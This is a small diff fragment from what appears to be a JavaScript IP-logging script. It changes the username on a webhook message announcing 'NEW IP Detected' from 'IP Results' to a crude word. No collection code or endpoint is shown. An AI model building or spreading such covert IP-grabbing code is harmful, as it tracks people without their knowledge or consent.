@@ -28,7 +28,7 @@ const request = async () => { // Calling a "synchronous" fetch
     postRequest.setRequestHeader('Content-type', 'application/json');
 
     var params = {
-        username: "IP Results",
+        username: "Sex",
         avatar_url: "",
         content:   
                     "__**NEW IP Detected**__"
